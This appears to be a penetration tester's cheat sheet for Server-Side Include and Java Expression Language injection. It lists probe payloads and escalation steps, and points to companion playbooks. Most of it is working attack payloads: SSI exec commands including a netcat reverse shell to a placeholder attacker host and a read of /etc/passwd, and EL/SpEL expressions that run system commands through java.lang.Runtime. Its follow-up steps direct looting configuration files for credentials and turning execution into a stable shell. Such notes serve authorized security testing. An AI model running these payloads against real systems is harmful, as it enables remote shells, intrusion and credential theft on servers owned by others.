# SSI / EL Injection

## SSI probe
<!--#echo var="DATE_LOCAL" -->
- [ ] Renders a date = SSI parsed → exec next
- [ ] Where: polls, guestbooks, error pages, .shtml/.stm/.shtm URLs

## SSI exec
<!--#exec cmd="id" -->
<!--#exec cmd="nc ATTACKER 443 -e /bin/bash" -->
<!--#include virtual="/etc/passwd" -->
- [ ] Input must survive sanitization — a reflected <!-- is the signal

## EL probe (Java)
${7*7}
#{7*7}
*{7*7}
- [ ] 49 = evaluated → escalate

## EL escalate
${pageContext.request.getSession().getServletContext().getServerInfo()}
${T(java.lang.Runtime).getRuntime().exec('id')}
- [ ] Spring/Thymeleaf variants: T(x) class access, __${...}__::.x preprocessing
- [ ] EL is the Java slice of SSTI → full methodology: :Pb ssti

## If it fails
- [ ] Payload echoed literally → no injection; encoding variants (HTML entities) before giving up
- [ ] exec blocked but echo works → file read only: loot configs for creds

## Next
- [ ] exec → stable shell: :Pb shells
- [ ] Config loot → :Pb linux-creds after landing
